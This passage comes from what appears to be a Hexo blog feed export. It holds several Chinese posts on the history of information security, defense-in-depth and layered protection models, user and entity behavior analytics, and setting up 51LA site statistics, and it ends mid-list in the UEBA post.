src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息系统安全的发展演变</title>
      <link href="/posts/cb0f48b6/"/>
      <url>/posts/cb0f48b6/</url>
      
        <content type="html"><![CDATA[<p>随着通信技术和信息技术的发展，极大的改变了人们处理信息的方式和效率。计算机网络尤其是互联网的出现是信息技术发展中一个里程碑事件。计算机网络将通信技术和计算机技术结合起来。信息在计算机上产生、处理，并在网络中传输。网络信息系统安全是通信安全和信息系统安全的综合，网络信息安全已经覆盖了信息资产的生成、处理、传输和存储等各个阶段。包括信息自身的安全、信息应用的安全、计算机信息系统安全、通信网络安全。</p><table> <tr><td rowspan="2">信息安全</td><td>信息应用安全</td></tr> <tr><td> 信息自身安全</td></tr> <tr><td rowspan="2">信息基础设施安全</td><td>计算机系统安全</td></tr> <tr> <td>通信网络安全</td></tr></table><p>网络信息系统安全随着通信技术和信息技术的发展，大致经历了通信保密年代、计算机系统安全年代、信息系统网络安全年代、网络空间安全年代。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220402/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%91%E5%B1%95%E6%BC%94%E5%8F%98.png" alt="网络信息系统安全的发展演变"></p><h2 id="一、通信保密年代"><a href="#一、通信保密年代" class="headerlink" title="一、通信保密年代"></a>一、通信保密年代</h2><p>1906年，美国物理学家费森登( Fessenden )成功地研究出无线电广播。法国人克拉维尔建立了英法第一条商用无线电线路，推动了无线电技术的进一步发展。<br>进入20世纪，尤其是在“二战”时期，军事和外交方面的巨大需求，使得无线通信技术得到飞速发展，被广泛用来传递军事情报、作战指令、外交政策等各种关键信息。21世纪，通信技术突飞猛进的发展，移动通信和数字通信成为通信技术的主流，现代世界中通信技术成为支撑整个社会的命脉和根本。<br>在通信保密年代，网络信息安全面临的主要威胁是攻击者对通信内容的窃取:有线通信容易被搭线窃听、无线通信由于电磁波在空间传播易被监听。保密成为通信安全阶段的核心安全需求。这阶段主要通过密码技术对通信的内容进行加密，保证数据的保密性和完整性，而破译成为攻击者对这种安全措施的反制。</p><h2 id="二、计算机系统安全年代"><a href="#二、计算机系统安全年代" class="headerlink" title="二、计算机系统安全年代"></a>二、计算机系统安全年代</h2><p>计算机经历了电子计算机、晶体管计算机、集成电路计算机等几个阶段。尤其是在进入20世纪70年代后,随着个人计算机的普及，各行各业都迅速采用计算机处理各种业务。计算机在处理、存储信息数据等方面的应用越来越广泛。美国国家标准局公布了《数据加密标准》( Data Encryption Standard,DES )，标志着信息安全由通信保密阶段进人计算机安全阶段。这个时期，计算机网络尚未大规模普及，相对于电话电报，计算机对信息的处理和存储能力强大，但数据长距离、大容量的传输方式较单一，功能相对较弱(主要通过软盘等形式传输)。因此，计算机阶段主要威胁来自于非授权用户对计算资源的非法使用、对信息的修改和破坏。<br>20世纪80年代计算机安全的概念开始成熟。计算机安全的主要目的是采取措施和控制以确保信息系统资产(包括硬件、软件、固件和通信、存储和处理的信息)的保密性、完整性和可用性。典型代表措施是通过操作系统的访问控制手段来防止非授权用户的访问。</p><h2 id="三、信息系统网络安全年代"><a href="#三、信息系统网络安全年代" class="headerlink" title="三、信息系统网络安全年代"></a>三、信息系统网络安全年代</h2><p>计算机网络尤其是互联网的出现是信息技术发展中一个里程碑事件。计算机网络将通信技术和计算机技术结合起来。信息在计算机上产生、处理，并在网络中传输。信息技术由此进人网络阶段，网络阶段利用通信技术将分布的计算机连接在一起，形成覆盖整个组织机构甚至整个世界的信息系统。信息系统安全是通信安全和计算机安全的综合，信息安全需求已经全面覆盖了信息资产的生成、处理、传输和存储等各阶段,确保信息系统的保密性、完整性和可用性。信息系统安全也曾被称为网络安全，主要是保护信息在存储、处理和传输过程中免受非授权的访问，防止授权用户的拒绝服务，同时检测、记录和对抗此类威胁。为了抵御这些威胁，人们开始使用防火墙、防病毒、PKI、 VPN等安全产品。此阶段的主要标志是发布了《信息技术安全性评估通用准则》，此准则即通常所说的通用准则( Common Criteria,CC)，后转变为国际标准ISO/IEC 15408,我国等同采纳此国际标准为国家标准GB/T 18336。</p><h2 id="四、网络空间安全年代"><a href="#四、网络空间安全年代" class="headerlink" title="四、网络空间安全年代"></a>四、网络空间安全年代</h2><p>随着互联网的不断发展，越来越多的设备被接人并融合，技术的融合将传统的虚拟世界与物理世界相互连接，共同构成了一个新的IT世界。互联网成为个人生活、组织机构甚至国家运行不可或缺的一部分，网络空间随之诞生，信息化发展进人网络空间阶段。网络空间作为新兴的第五空间，已经成为新的国家竞争领域,威胁来源从个人上升到犯罪组织，甚至上升到国家力量的层面。<br>“网络空间( Cyberspace)”一词，由加拿大作家威廉●吉布森在其短篇科幻小说《燃烧的铬》中创造出来，原意指由计算机创建的虚拟信息空间，体现了Cyberspace 不仅是信息的简单聚合体，也包含了信息对人类思想认知的影响。此后，随着信息技术的快速发展和互联网的广泛应用，Cyberspace 的概念不断丰富和演化。<br>随着信息化的不断深人，信息系统成为组织机构工作和生活不可或缺的一部分，信息安全威胁来源从个人上升到犯罪组织，甚至国家力量。在这个阶段，人们认识到信息安全保障不能仅仅依赖于技术措施，开始意识到管理的重要性和信息系统的动态发展性，信息安全保障的概念逐渐形成和成熟。<br>信息安全保障把信息系统安全从技术扩展到管理，从静态扩展到动态，通过各种安全保障技术和安全保障管理措施的综合融合至信息化中，形成对信息、信息系统乃至业务以及使命的保障。信息安全保障时代，其主要标志是《信息保障技术框架》（IATF）。如果说对信息的保护，主要还是处于从传统安全理念到信息化安全理念的转变过程中，那么面向业务的安全保障，就完全是从信息化的角度来考虑信息的安全了。体系性的安全保障理念，不仅是关注系统的漏洞，而且是从业务的生命周期着手，对业务流程进行分析，找出流程中的关键控制点，从安全事件出现的前、中、后三个阶段进行安全保障。面向业务的安全保障不是只建立防护屏障，而是建立一个“深度防御体系”，通过更多的技术手段把安全管理与技术防护联系起来，不再是被动地保护自己，而是主动地防御攻击。也就是说，面向业务的安全防护已经从被动走向主动，安全保障理念从风险承受模式走向安全保障模式。信息安全阶段也转化为从整体角度考虑其体系建设的信息安全保障时代。<br>2009年5月29日，美国发布《网络空间政策评估:确保信息和通信系统的可靠性和韧性》报告。云计算、虚拟化、物联网、移动互联网、大数据、人工智能等新技术的出现，使得网络空间安全的问题无比复杂。<br>2016年12月，我国发布了《国家网络空间安全战略》，明确了网络空间是国家安全的新疆域，已经成为与陆地、海洋、天空、太空同等重要的人类活动新领域，国家主权拓展延伸到网络空间，网络空间主权成为国家主权的重要组成部分。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客加入51LA网站流量统计</title>
      <link href="/posts/f571f2b1/"/>
      <url>/posts/f571f2b1/</url>
      
        <content type="html"><![CDATA[<p>自建hexo博客xiejava.ishareread.com一直在用CNZZ的网站流量统计，每天登陆到CNZZ的网站流量统计后台看博客的访问量成了建站以来的习惯。3月23日以后突然发现CNZZ的统计没有数据了，查了半天才知道CNZZ的U-Web统计分析产品停服了，计划要收费了。最开始用百度统计也是的，原来用得好好的，突然也是要收费了才开始转向用CNZZ的，现在CNZZ也要开始收费了。看来互联网公司日子比较难过了，免费时代已经一去不复返了。对于个人博客网站来说要付费买个网站流量统计又有点划不来。本来流量就很少，每年域名要付费、主机要付费，再弄个流量统计也要付费实在是有点承受不了。但是没有网站流量统计，不能看到自己的站点的访问量，对于个人自建网站来讲失去了大部分的乐趣。<br>所以这几天一直在寻找其他的网站流量统计的工具，只到找到了51LA。以前只知道百度和CNZZ的网站流量统计工具，最近才了解到51LA统计，它是15年老牌网站统计工具，是互联网上最早基于ASP编写的网站数据统计工具，拥有一大批忠实老站长，后来历经改造，推出新版51LA统计目前是网站统计V6，界面较以往有了较大的改动更加友好直观。<br>51LA网站统计V6的产品链接是 <a href="https://v6.51.la/" target="_blank" rel="noopener">https://v6.51.la/</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/51LA%E7%BD%91%E7%AB%99%E7%BB%9F%E8%AE%A1V6.png" alt="我要啦网站统计V6"></p><p>看到”<strong>免费使用</strong>“几个大字的时候我的眼睛已经发光了。迫不及待的点击“注册”，进行使用。</p><h2 id="一、注册登录"><a href="#一、注册登录" class="headerlink" title="一、注册登录"></a>一、注册登录</h2><p>注册流程很简单，要注册的信息很少，基本上就是手机号和登录密码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E6%B3%A8%E5%86%8C.png" alt="注册"></p><p>注册过程很友好，注册完就可以登录了。</p><h2 id="二、添加应用"><a href="#二、添加应用" class="headerlink" title="二、添加应用"></a>二、添加应用</h2><p>在正式使用网站统计服务之前要添加应用。也就是要将要统计的站点域名登记到应用里，生成统计代码。<br>点击“添加应用”按钮。要填的信息也就是你要统计的站点域名，可以是多个域名。我的hexo博客除了用到xiejava.ishareread.com外还在github和gited上都生成了。所以把这几个访问的域名都加上。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E6%B7%BB%E5%8A%A0%E5%BA%94%E7%94%A8.png" alt="添加应用"></p><h2 id="三、加入网站流量统计代码"><a href="#三、加入网站流量统计代码" class="headerlink" title="三、加入网站流量统计代码"></a>三、加入网站流量统计代码</h2><p>添加应用后下一步就是生成统计代码，将统计代码加入到自己的hexo站点。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E7%94%9F%E6%88%90%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81.png" alt="生成统计代码"><br>标签页后面还有“图标引用”、“数据挂件”的代码，如果有需要也可以加入。<br>找到自己的hexo站点的文件目录的<code>footer.swig</code>文件，具体在<code>themes\hexo-theme-next\layout\_partials</code>目录下。编辑footer.swig文件，加入统计代码，根据需要加入图标引用、数据挂件的代码。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E5%8A%A0%E5%85%A5%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81.png" alt="加入统计代码"></p><h2 id="四、查看统计效果"><a href="#四、查看统计效果" class="headerlink" title="四、查看统计效果"></a>四、查看统计效果</h2><p>加入统计代码、图标引用、数据挂件代码后，大约5分钟刷新hexo站点，就可以在网站底部看到图标和数据挂件。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E7%BD%91%E7%AB%99%E5%BA%95%E9%83%A8%E7%BB%9F%E8%AE%A1%E6%98%BE%E7%A4%BA.png" alt="网站底部统计显示"></p><p>登录到<a href="https://v6.51.la/user/application" target="_blank" rel="noopener">https://v6.51.la/user/application</a> 的管理后台，可以看到代码安装状态为“安装成功”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E5%BA%94%E7%94%A8%E5%88%97%E8%A1%A8.png" alt="应用列表"></p><p>点击“查看报表”可以查看网站的流量统计分析信息。各种统计图表直观易懂，数据详实，感觉比CNZZ 及百度统计更加实用和方便。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220401/%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86.png" alt="管理后台"><br>51LA可免费添加应用30个，每日应用统计总PV在3000000，对于个人站点或小型企业足足够用了。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全之纵深防御</title>
      <link href="/posts/e2fd4a90/"/>
      <url>/posts/e2fd4a90/</url>
      
        <content type="html"><![CDATA[<p>什么是“纵深防御”？很多人和资料都有不同的解释，有许多资料将“纵深防御”和“分层防护”等同起来，<br>上次文章介绍了“<a href="https://xiejava.blog.csdn.net/article/details/123794343" target="_blank" rel="noopener">分层防护</a>”，分层防护是根据网络的应用现状情况和网络的结构，将安全防范体系的层次划分为物理层安全、系统层安全、网络层安全、应用层安全和安全管理等各个层级，在每个层级实施相应的防护策略和手段。“纵深防御”与“分层防护”既有区别又有联系。</p><p>“纵深防御”实际上并不是一个网络安全领域的专属名词，早在二十世纪初，前苏联元帅米·尼·图哈切夫斯基就在对第一次世界大战以及国内战争经验的基础上，提出了一种名为“大纵深作战理论”的思想。由于网络安全的本质就是黑客与开发者之间的攻防战，所以信息安全领域中的“纵深防御”概念确与战争学上的思想有着共通之处，其核心都是多点布防、以点带面、多面成体，以形成一个多层次的、立体的全方位防御体系来挫伤敌人、保障自身的整体安全。</p><p>根据《信息安全工程师教程（第2版）》的描述，<strong>纵深防御模型的基本思路就是将信息网络安全防护措施有机组合起来，针对保护对象，部署合适的安全措施，形成多道保护线，各安全防护措施能够相互支持和补救，尽可能地阻断攻击者的威胁</strong>。目前，安全业界认为网络需要建立四道防线：安全保护是网络的第一道防线，能够阻止对网络的入侵和危害；安全监测是网络的第二道防线，可以及时发现入侵和破坏；实施响应是网络的第三道防线，当攻击发生时维持网络”打不垮”；恢复是网络的第四道防线，使网络在遭受攻击后能够以最快的速度“起死回升”，最大限度地降低安全事件带来的损失。看描述基本上是对应美国国防部提出的PDRR模型，即（Protection防护、Detection检测、Recovery恢复、Response响应）。PDRR改进了传统的只有防护的单一安全防御思想，强调信息安全保障的四个重要环节。<br>保护（Protection）的内容主要有加密机制、数据签名机制、访问控制机制、认证机制、信息隐藏、防火墙技术等。<br>检测（Detection）的内容主要有入侵检测、系统脆弱性检测、数据完整性检测、攻击性检测等。<br>恢复（Recovery）的内容主要有数据备份、数据修复、系统恢复等。<br>响应（Response）的内容主要有应急策略、应急机制、应急手段、入侵过程分析及安全状态评估等。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220330/PDRR.png" alt="PDRR"></p><p>但是PPDR模型总体还是比较局限与从技术上考虑安全问题。随着信息化的发展，人们越来越意识到信息安全涉及面非常广，除了技术，管理、制度、人员和法律等方面也是信息安全必须考虑的因素，就像一个由多块木板构成的“木桶”，木桶的容量由最短的那块短板决定。在处理信息安全问题是，需要全面考虑各方面的因素。</p><p>所以美国国家安全局（NSA）发布的信息安全保障技术框架IATF（Information Assurance Technical Framework）提出了纵深防御战略思想，其3个核心要素就是人、技术和操作。信息系统安全保障依赖于人、技术和操作来共同实现组织机构的职能。<br>IATF用一句话概括起来就是：<strong>一个核心思想、三个核心要素、四个焦点领域</strong>。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220330/IATF%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1.png" alt="IATF纵深防御"></p><p><strong>一个核心思想</strong><br>一个核心思想就是”纵深防御”，<strong>纵深防御也被称为深度防护战略（Defense-in-Depth），是指网络安全需要采用一个多层次、纵深的安全措施来保障信息安全。因为网络信息的安全不是仅仅依靠一两种技术或简单的安全防御设施就能实现，必须在各个层次、不同技术框架区域中实施保障机制，才能最大程度地降低风险，应对攻击并保护信息系统的安全</strong>。在一个规范的信息系统网络中，我们可以看到在网络出口有防火墙，在DMZ区有防火墙，在服务器前端还有防火墙，这就是纵深防御思想的一个体现。需要在多个位置部署安全措施，看似重复，但是因其面对不同的业务、其安全策略有很大的差异。</p><p><strong>三个核心要素</strong><br>三个核心要素是人、技术、操作。网络安全三分靠技术、七分靠管理，三要素中的“人”指的就是加强管理。<br>人是信息系统的主题，包括信息系统的拥有者、管理者和使用者，是信息安全保障的核心；<br>技术是重要手段，需要通过技术机制来保障各项业务的安全，是一种被动防御；<br>操作也称为运行或运营安全，是一种主动防御的体系和机制，包括风险评估、监控、审计、入侵检测等。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220330/%E4%B8%89%E4%B8%AA%E6%A0%B8%E5%BF%83%E8%A6%81%E7%B4%A0.png" alt="三个核心要素"></p><p><strong>四个焦点领域</strong><br>网络和基础设施、区域边界、计算环境、支撑性基础设施4个焦点领域。基于这4个焦点领域，结合IATF纵深防御的思想进行信息安全防御从而形成保障框架。</p><p>1.保护网络和基础设施</p><p>网络和其他基础设施是信息系统及业务的支撑，是整个信息系统安全的基础。应采取措施确保网络和基础设施能稳定可靠运行，不会因故障和外界影响导致服务的中断或数据延迟，确保在网络中进行传输的公共的、私人的信息能正确地被接收者获取，不会导致未受权的访问、更改等。保护网络和基础设施防护措施包括但并不限于以下方式。</p><ul><li>合理规划以确保骨干网可用性。</li><li>使用安全的技 术架构，例如在使用无线网络时考虑安全的技术架构。</li><li>使用冗余设备提高可用性。</li><li>使用虚拟专网 ( VPN)保护通信。</li></ul><p>2.保护区域边界</p><p>信息系统根据业务、管理方式和安全等级的不同，通常可以划分为多个区域，这些区或多或少都有与其他区域相连接的边界。保护区域边界关注的是如何对进出这此区域边界的数据流进行有效的控制与监视。要合理地将信息系统根据业务、管理方式和安全等级划分不同的安全区域，并明确定义不同网络区域间需要哪些数据传递。在此基础上采取措施对数据进行控制与监视。通常采取的措施包括但并不限于以下方式。</p><ul><li>在区域边界设 置身份认证和访问控制措施，例如部署防火墙对来访者进行身份认证。</li><li>在区域边 界部署人侵检测系统以发现针对安全区域内的攻击行为。</li><li>在区域边界部署防病毒网关以发现并过滤数据中的恶意代码。</li><li>使用VPN设备以确保安全的接人。</li><li>部署抗拒绝服务攻击设备以应对拒绝服务攻击。</li><li>流量管理、行为管理等其他措施。</li></ul><p>3.保护计算环境</p><p>计算环境指信息系统中的服务器、客户机及其中安装的操作系统、应用软件等。保护计算环境通常采用身份鉴别、访问控制、加密等一系列技术以确保计算环境内的数据保密性、完整性、可用性、不可否认性等。保护计算环境的措施包括但并不限于以下方式。<br>安装并使用安全的操作系统和应用软件。</p><ul><li>在服务 器上部署主机入侵检测系统、防病毒软件及其他安全防护软件。</li><li>定期对系统进行漏洞扫描或者补丁加固，以避免系统脆弱性。</li><li>定期对系统进行安全配置检查，确保最优配置。</li><li>部署或配置对文件的完整性保护。</li><li>定期对 系统和数据进行备份等。</li></ul><p>4.支撑性基础设施</p><p>支撑性基础设施是提供安全服务的基础设施及与之相关的一系列活动的综合体。IATF定义了两种类型的支撑性基础设施：密钥管理基础设施( KMI) /公钥基础设施( PKI)和检测与响应。</p><ul><li>KMI/PKI：提供支持密钥、授权和证书管理的密码基础设施并能实现使用网络服务人员确实的身份识别。</li><li>检测与响应：提供入侵检测、报告、分析、评估和响应基础设施，它能迅速检测和响应入侵、异常事件并提供运行状态的情况。</li></ul><p>IATF的4个技术焦点区域是一个逐层递进的关系，从而形成一种纵深防御系统。因此，以上4个方面的应用充分贯彻了纵深防御的思想，对整个信息系统的各个区域、各个层次，甚至在每一个层次内部都部署了信息安全设备和安全机制，保证访问者对每一个 系统组件进行访问时都受到保障机制的监视和检测，以实现系统全方位的充分防御，将系统遭受攻进行访问时都受到保障机制的监视和检测，以实现系统全方位的充分防御，将系统遭受攻击的风险降至最低,确保数据的安全和可靠。</p><p>除了纵深防御这个核心思想之外，IATF还提出了其他一些信息安全原则，包括保护多个位置、分层防护。<br>1.保护多个位置<br>保护多个位置包括保护网络和基础设施、区域边界、计算环境等,这一原则提醒我们，仅仅在信息系统的重要敏感区域设置一些保护装置 是不够的，任意一个系统漏洞都有可能导致严重的攻击和破坏后果，所以在信息系统的各个方位布置全面的防御机制，才能将风险降至最低。<br>2.分层防御<br>如果说保护多个位置原则是横向防御，那么这一原则就是纵向防御，这也是纵深防御思想的一个具体体现。分层防御即在攻击者和目标之间部署多层防御机制，每个这样的机制必须对攻击者形成一道屏障。而且每一个这样的机制还应包括保护和检测措施，以使攻击者不得不面对被检测到的风险，迫使攻击者由于高昂的攻击代价而放弃攻击行为。</p><p>可见，<strong>纵深防御是战略思想、分层防护是具体的战术实现</strong>。</p><p>资料来源：<br>《信息安全工程师教程（第2版）》<br>《CISP培训教材》</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全体系之分层防护</title>
      <link href="/posts/3a099914/"/>
      <url>/posts/3a099914/</url>
      
        <content type="html"><![CDATA[<p>作为全方位的、整体的网络安全防范体系也是分层次的，不同层次反映了不同的安全问题，根据网络的应用现状情况和网络的结构，将安全防范体系的层次划分为物理层安全、系统层安全、网络层安全、应用层安全和安全管理。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220328/%E5%88%86%E5%B1%82%E9%98%B2%E6%8A%A4.png" alt="分层防护"></p><h2 id="1-物理环境的安全性-物理层安全"><a href="#1-物理环境的安全性-物理层安全" class="headerlink" title="1.物理环境的安全性(物理层安全)"></a>1.物理环境的安全性(物理层安全)</h2><p>该层次的安全包括通信线路的安全，物理设备的安全，机房的安全等。物理层的安全主要体现在通信线路的可靠性(线路备份、网管软件、传输介质)，软硬件设备安全性(替换设备、拆卸设备、增加设备)，设备的备份，防灾害能力、防干扰能力，设备的运行环境(温度、湿度、烟尘)，不间断电源保障，等等。</p><h2 id="2-操作系统的安全性-系统层安全"><a href="#2-操作系统的安全性-系统层安全" class="headerlink" title="2.操作系统的安全性(系统层安全)"></a>2.操作系统的安全性(系统层安全)</h2><p>该层次的安全问题来自网络内使用的操作系统的安全，如Windows NT，Windows 2000等。主要表现在三方面，一是操作系统本身的缺陷带来的不安全因素，主要包括身份认证、访问控制、系统漏洞等。二是对操作系统的安全配置问题。三是病毒对操作系统的威胁。</p><h2 id="3-网络的安全性-网络层安全"><a href="#3-网络的安全性-网络层安全" class="headerlink" title="3.网络的安全性(网络层安全)"></a>3.网络的安全性(网络层安全)</h2><p>该层次的安全问题主要体现在网络方面的安全性，包括网络层身份认证，网络资源的访问控制，数据传输的保密与完整性，远程接入的安全，域名系统的安全，路由系统的安全，入侵检测的手段，网络设施防病毒等。</p><h2 id="4-应用的安全性-应用层安全"><a href="#4-应用的安全性-应用层安全" class="headerlink" title="4.应用的安全性(应用层安全)"></a>4.应用的安全性(应用层安全)</h2><p>该层次的安全问题主要由提供服务所采用的应用软件和数据的安全性产生，包括Web服务、电子邮件系统、DNS等。此外，还包括病毒对系统的威胁。</p><h2 id="5-管理的安全性-管理层安全"><a href="#5-管理的安全性-管理层安全" class="headerlink" title="5.管理的安全性(管理层安全)"></a>5.管理的安全性(管理层安全)</h2><p>安全管理包括安全技术和设备的管理、安全管理制度、部门与人员的组织规则等。管理的制度化极大程度地影响着整个网络的安全，严格的安全管理制度、明确的部门安全职责划分、合理的人员角色配置都可以在很大程度上降低其它层次的安全漏洞。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是用户实体行为分析（UEBA）</title>
      <link href="/posts/973478d/"/>
      <url>/posts/973478d/</url>
      
        <content type="html"><![CDATA[<h1 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h1><p>数字新时代正在加速全面到来，网络环境变得更加多元、人员变得更复杂、接入方式多种多样，网络边界逐渐模糊甚至消失，同时伴随着企业数据的激增。数字化转型促进组织的业务发展的同时，也带来了重大的网络安全挑战。<br>1.越来越多的外部攻击，包括被利益驱动或国家驱动的难以察觉的高级攻击；<br>2.心怀恶意的内鬼、疏忽大意的员工、失陷账号与失陷主机导致的各种内部威胁；<br>3.数字化基础设施的脆弱性和风险暴露面越来越多，业务需求多变持续加剧的问题；<br>4.安全团队人员不足或能力有限，深陷不对称的“安全战争”之中。<br>在数字化带来的巨大变化下，传统的安全威胁发现能力受到了巨大的挑战。传统安全产品、技术、方案基本上都是基于已知特征进行规则匹配来进行分析和检测，基于特征、规则和人工分析，以“特征”为核心的检测分析存在安全可见性盲区，有严重的滞后效应、无力检测未知攻击、容易被绕过，以及难以适应攻防对抗的网络现实和快速变化的企业环境、外部威胁等问题。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220324/%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png" alt="特征分析与行为分析"></p><p>安全是人和人攻防对抗的游戏，一切的意图都需要通过行为表达，这是安全运营中最重要也最有价值的一块拼图，同时也是传统方式最欠缺的。针对传统方式的不足，安全行业逐步加强基于大数据驱动，机器学习、概率分析、模式识别等的以“行为”为核心的检测分析。<br>用户实体行为分析（UEBA）应运而生。</p><h1 id="二、UEBA是什么"><a href="#二、UEBA是什么" class="headerlink" title="二、UEBA是什么"></a>二、UEBA是什么</h1><p><strong>UEBA全名User and Entity Behavior Analytics ，即为用户实体行为分析。</strong><br>Gartner 对 UEBA 的定义是“UEBA 提供画像及基于各种分析方法的异常检测，通常是基本分析方法（利用签名的规则、模式匹配、简单统计、阈值等）和高级分析方法（监督和无监督的机器学习等），用打包分析来评估用户和其他实体（主机、应用程序、网络、数据库等），发现与用户或实体标准画像或行为相异常的活动所相关的潜在事件。这些活动包括受信内部或第三方人员对系统的异常访问（用户异常），或外部攻击者绕过安全控制措施的入侵（异常用户）</p><p>用户行为分析(UBA)关联了用户活动和相关实体（用户相关的应用和终端等）信息构建人物角色与群组，进一步定义这些个体与群组的合法和正常行为，把这些人物角色在群体与群体、群体与个体、个体与个体（那些远离合法和正常行为的群体与个体）维度上相互比对分析，将异常用户（失陷账号）和用户异常（非法行为）检测出来，从而达到检测业务欺诈、敏感数据泄露、内部恶意用户、有针对性攻击等高级威胁的目的。</p><h1 id="三、UEBA应用场景"><a href="#三、UEBA应用场景" class="headerlink" title="三、UEBA应用场景"></a>三、UEBA应用场景</h1><h2 id="1-账号安全"><a href="#1-账号安全" class="headerlink" title="1  账号安全"></a>1  账号安全</h2><p>内部员工特别是高权限用户，以及服务和共享类帐户是内部和外部攻击者的主要目标。通过获取他们的访问权限则能够访问最敏感的交易、数据，甚至可以创建其他新特权帐户或滥用提权操作。由于公司账号数量庞大且难以区分滥用和合法使用，组织在监控这些帐户时面临着巨大的挑战。有效监控特权帐户不仅是一项重要的合规性要求，而且还是一项关键的威胁管理功能。和专有的特权账号管理应用（PAM，Privileged Account Management），PAM类应用提供了特权账号的全生命周期管理，而对特权账号异常行为的监控、检测、分析则是PAM的一类高级功能。PAM 内置的特权账号异常检测能力相对较弱，所以一些 PAM 供应商会跟 UEBA 产品集成，将 PAM 检测到的异常事件接入 UEBA 产品的高级分析引擎中，和其他维度的数据一起做更深层次的特权账号异常事件识别。<br>细分账号安全的场景，大致有两类。一类是账号本身的操作异常，如创建、提权、删除、暂停、撤回存在异常行为，静默账号忽然出现活动。另一类通过对账号行为如登录的时间、地点、频次的异常监控，判断账号是否被盗用或被攻陷。</p><h2 id="2-内部威胁"><a href="#2-内部威胁" class="headerlink" title="2 内部威胁"></a>2 内部威胁</h2><p>相比于不受信任的外部人员，内部员工访问和获取公司重要信息的要轻松很多。一方面公司的大部分安全防护、访问控制都是针对外来的攻击者；另一方面内部人员对组织的人员、规章、制度都有一定程度的了解，从而可以利用这些便利性来躲过安全防护检测。内部威胁者通常分为两类，一类是恶意内部人员，即合法的人员利用自己的权限做非法的事情。比如，下载大量重要的客户数据贩卖获取利益。另一类是内部人员账号被攻陷后的恶意行为。内部威胁检测的场景设计比较复杂，一般会从4个维度来考虑。</p><ol><li>建立用户行为风险画像 - 将所有身份、活动和访问特征，与基线、同组以及其他已知威胁指标进行比较，确定真正的风险区域。</li><li>高权限账号监控 – 